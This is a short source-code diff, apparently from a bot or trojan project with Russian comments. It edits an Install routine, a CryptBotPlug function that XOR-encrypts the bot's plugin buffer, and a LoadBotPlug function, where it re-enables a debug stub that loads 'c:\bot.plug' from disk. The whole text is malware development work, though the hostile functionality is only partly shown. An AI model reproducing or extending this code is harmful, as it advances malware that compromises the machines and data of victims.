@@ -43,9 +43,7 @@ namespace INSTALLERDEBUGSTRINGS
 //                         удалением исходного файла
 //----------------------------------------------------
 BOOL WINAPI Install(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID)
-
 {
-
 	if (!File::IsExists((PCHAR)FileName))
 		return FALSE;
 
@@ -147,7 +145,6 @@ BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
 
     XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);
 
-	STR::Free(Pass);
 	return TRUE;
 }
 
@@ -267,11 +264,13 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 	*Buf = NULL;
 
 
+#ifdef DEBUGCONFIG
 	// Заглушка на время тестов
-//	DWORD Sz = 0;
-//	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
-//	if (BufSize) *BufSize = Sz;
-//	return *Buf != NULL;
+	DWORD Sz = 0;
+	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
+	if (BufSize) *BufSize = Sz;
+	return *Buf != NULL;
+#endif
 
 
 
